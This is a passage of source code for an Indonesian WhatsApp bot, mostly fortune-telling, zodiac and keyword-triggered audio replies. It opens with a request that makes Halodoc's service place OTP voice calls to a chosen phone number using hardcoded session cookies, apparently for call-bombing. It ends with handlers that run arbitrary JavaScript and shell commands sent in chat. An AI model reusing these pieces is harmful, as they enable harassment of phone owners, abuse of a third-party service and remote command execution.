axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
break
case 'artimimpi': case 'tafsirmimpi': {
 if (!dtext) throw `Example : ${prefix + command} belanja`
 let anu = await primbon.tafsir_mimpi(dtext)
 if (anu.status == false) return replyv1(anu.message)
 vinz.sendText(m.chat, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
}
break
//=================================================//
case 'ramalanjodoh': case 'ramaljodoh': {
 if (!dtext) throw `Example : ${prefix + command} Vinz X7, 7, 7, 2004, Nesya, 16, 11, 2006`
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = dtext.split`,`
 let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
 if (anu.status == false) return reply(anu.message)
 vinz.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artinama': {
 if (!dtext) throw `Example : ${prefix + command} Vinz X7`
 let anu = await primbon.arti_nama(dtext)
 if (anu.status == false) return reply(anu.message)
 vinz.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'kecocokannama': case 'cocoknama': {
 if (!dtext) throw `Example : ${prefix + command} Vinx X7, 7, 7, 2004`
 let [nama, tgl, bln, thn] = dtext.split`,`
 let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
 if (anu.status == false) return replyv1(anu.message)
 vinz.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
}
break
//=================================================//
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
 if (!dtext) throw `Example : ${prefix + command} Vinz X7|Nesya`
 let [nama1, nama2] = dtext.split`|`
 let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
 if (anu.status == false) return reply(anu.message)
 vinz.sendImage(m.chat,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
break
//=================================================//
case 'jadianpernikahan': case 'jadiannikah': {
 if (!dtext) throw `Example : ${prefix + command} 6, 12, 2020`
 let [tgl, bln, thn] = dtext.split`,`
 let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 vinz.sendText(m.chat, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
}
break
//=================================================//
case 'sifatusaha': {
 if (!dtext)throw `Example : ${prefix+ command} 28, 12, 2021`
 let [tgl, bln, thn] = dtext.split`,`
 let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 vinz.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
}
break
//=================================================//
case 'rejeki': case 'rezeki': {
 if (!dtext) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = dtext.split`,`
 let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 vinz.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'pekerjaan': case 'kerja': {
 if (!dtext) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = dtext.split`,`
 let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 vinz.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
 if (!dtext) throw `Example : 7, 7, 2005`
 let [tgl, bln, thn] = dtext.split`,`
 let anu = await primbon.ramalan_nasib(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 vinz.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
}
break
//=================================================//
case 'potensipenyakit': case 'penyakit': {
 if (!dtext) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = dtext.split`,`
 let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 vinz.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'zodiak': case 'zodiac': {
 if (!dtext) throw `Example : ${prefix+ command} Tahun Bulan Tanggal/2005 9 9`
 let zodiak = [
 ["capricorn", new Date(1970, 0, 1)],
 ["aquarius", new Date(1970, 0, 20)],
 ["pisces", new Date(1970, 1, 19)],
 ["aries", new Date(1970, 2, 21)],
 ["taurus", new Date(1970, 3, 21)],
 ["gemini", new Date(1970, 4, 21)],
 ["cancer", new Date(1970, 5, 22)],
 ["leo", new Date(1970, 6, 23)],
 ["virgo", new Date(1970, 7, 23)],
 ["libra", new Date(1970, 8, 23)],
 ["scorpio", new Date(1970, 9, 23)],
 ["sagittarius", new Date(1970, 10, 22)],
 ["capricorn", new Date(1970, 11, 22)]
 ].reverse()

 function getZodiac(month, day) {
 let d = new Date(1970, month - 1, day)
 return zodiak.find(([_,_d]) => d >= _d)[0]
 }
 let date = new Date(dtext)
 if (date == 'Invalid Date') throw date
 let d = new Date()
 let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
 let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
 let zodiac = await getZodiac(birth[1], birth[2])
 let anu = await primbon.zodiak(zodiac)
 if (anu.status == false) return replyv1(anu.message)
 vinz.sendText(m.chat, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'couple': {
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
vinz.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, {quoted:troli})
vinz.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, {quoted:troli})
}
break
//=================================================//
case 'coffe': case 'kopi': {
vinz.sendMessage(m.chat, {image: { url: 'https://coffee.alexflipnote.dev/random' },
caption: `☕ Random Coffe`},{quoted:troli})
}
break
//=================================================//
case 'getname': {
if (!isAuthor) return replyv1('*Khusus Author*')
if (quoted === "true") {
namenye = await vinz.getName(m.sender)
replyv1(namenye)
} else if (quoted === "false") {
vinz.sendMessage(m.chat, {text:"Reply orangnya"}, {quoted:m})
}
}
break
//=================================================//
case 'getpic': {
if (!isAuthor) return replyv1('*Khusus Author*')
replywalu('Sialhkan Tunggu')
if (quoted === "true") {
try {
pporg = await vinz.profilePictureUrl(m.sender, 'image')
} catch {
pporg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
vinz.sendMessage(m.chat, { image : { url : pporg }, caption:`Done` }, {quoted:m})
} else if (quoted === "false") {
try {
pporgs = await vinz.profilePictureUrl(m.chat, 'image')
} catch {
pporgs = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
vinz.sendMessage(m.chat, { image : { url : pporgs }, caption:`Done` }, {quoted:m})
}
}
break
case 'cekapikey':
            if (!isCreator) return replyv1(mess.owner)
            let lol = await fetchJson(`https://api.lolhuman.xyz/api/checkapikey?apikey=${apikey}`)
            reply('Tunggu Mas')
            if (lol.message == 'success') {
                let ani = `• *ɴᴀᴍᴇ:* ${lol.result.username}
• *ᴛᴏᴛᴀʟ ʜɪᴛ:* ${lol.result.requests}
• *ʜɪᴛ ᴛᴏᴅᴀʏ:* ${lol.result.today}
• *ᴀᴄᴄᴏᴜɴᴛ:* ${lol.result.account_type}

• *ᴇxᴘɪʀᴇᴅ:* ${lol.result.expired}`
                vinz.sendMessage(m.chat, { image: thumb, caption: ani }, { quoted: fkontak })
                } else reply('ɪɴᴠᴀʟɪᴅ ᴀᴘɪᴋᴇʏ !')
            break
            case 'allrep':
            await sleep(2000)
            replycall('Testi Fake Reply New')
            await sleep(109)
            replycallv1('Testi Aja Bg')
            break
//-----------------------------------------------------------------//
default:

if (budy.includes(`assalamualaikum`)) {
                  reply('Waalaikumsalam')
                  }
		if (budy.includes(`Assalamualaikum`)) {
                  reply('Waalaikumsalam')
                  }
		if (budy.includes(`Thanks`)) {
                  replywalu(`Sama-sama`)
                  }
		if (budy.includes(`Thank`)) {
                  replywalu(`Sama-sama`)
                  }
                  if (budy.includes(`thanks`)) {
                  replywalu(`Sama-sama`)
                  }
//---------------------------------------------------------\\
if (budy.includes(`Anjg`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
		if (budy.includes(`anjg`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
                  if (budy.includes(`Jembot`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
		if (budy.includes(`Jembut`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
                  if (budy.includes(`Mmk`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
		if (budy.includes(`mmk`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
if (budy.includes(`Yatim`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
		if (budy.includes(`yatim`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
                  if (budy.includes(`ppk`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
		if (budy.includes(`Ppk`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
                  if (budy.includes(`Fefek`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
		if (budy.includes(`Ffk`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
                  if (budy.includes(`fefek`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
		if (budy.includes(`Tolol`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
                  if (budy.includes(`tolol`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
		if (budy.includes(`bangsat`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
                  if (budy.includes(`Bangsat`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
		if (budy.includes(`bngsat`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
                  if (budy.includes(`Bngsat`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
		if (budy.includes(`Taik`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
                  if (budy.includes(`taik`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
		if (budy.includes(`eek`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
                  if (budy.includes(`Fantek`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
		if (budy.includes(`fantek`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
                  if (budy.includes(`pantek`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
		if (budy.includes(`Pantek`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
                  if (budy.includes(`Fuck`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
		if (budy.includes(`fuck`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
                  if (budy.includes(`fucek`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
		if (budy.includes(`Fucek`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
                  if (budy.includes(`babi`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
		if (budy.includes(`Babi`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
                  if (budy.includes(`Memek`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
		if (budy.includes(`memek`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
                  if (budy.includes(`kntl`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
		if (budy.includes(`Kntl`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
                  if (budy.includes(`Kontol`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
		if (budy.includes(`Jancok`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
                  if (budy.includes(`jancok`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
		if (budy.includes(`kontol`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
                  if (budy.includes(`bangke`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
		if (budy.includes(`Bangke`)) {
                  soundnya = fs.readFileSync(`./toxic.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
//----------------------------------------------------------------------------------\\
if (budy.includes(`Hai`)) {
                  soundnya = fs.readFileSync(`./hai.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
		if (budy.includes(`Hallo`)) {
                  soundnya = fs.readFileSync(`./hai.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
                  if (budy.includes(`hai`)) {
                  soundnya = fs.readFileSync(`./hai.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
		if (budy.includes(`hallo`)) {
                  soundnya = fs.readFileSync(`./hai.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
                  if (budy.includes(`Ohayo`)) {
                  soundnya = fs.readFileSync(`./hai.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
//-----------------------------------------------------------------------------------\\
if (budy.includes(`Bot`)) {
                  soundnya = fs.readFileSync(`./bot.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
                  if (budy.includes(`bot`)) {
                  soundnya = fs.readFileSync(`./bot.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
                  if (budy.includes(`Kemana`)) {
                  soundnya = fs.readFileSync(`./bot.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
                  if (budy.includes(`kemana`)) {
                  soundnya = fs.readFileSync(`./bot.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
                  if (budy.includes(`sepi`)) {
                  soundnya = fs.readFileSync(`./bot.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
                  if (budy.includes(`Sepi`)) {
                  soundnya = fs.readFileSync(`./bot.mp3`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
                  }
//------------------------------------------------------------------------\\

//-------------------------------------------------------------------------\\

if (budy.startsWith('>')) {
    if (!isCreator) return
    try {
        let evaled = await eval(budy.slice(2))
        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
        await reply(evaled)
    } catch (err) {
        await reply(String(err))
    }
}

if (budy.startsWith('$')) {
    if (!isOwner) return
    require("child_process").exec(budy.slice(2), (err, stdout) => {
        if (err) return reply(`${err}`)
        if (stdout) return reply(stdout)
    })
}

}
	} catch (err) {
		const errId = isOwner ? m.chat : ownNumb.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		vinz.sendMessage(errId, {text: require('util').format(err)}, {quoted: m})
		console.log('\x1b[1;31m'+err+'\x1b[0m')
	}
}


let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
	require('fs').unwatchFile(file)
	console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
	delete require.cache[file]
	require(file)
})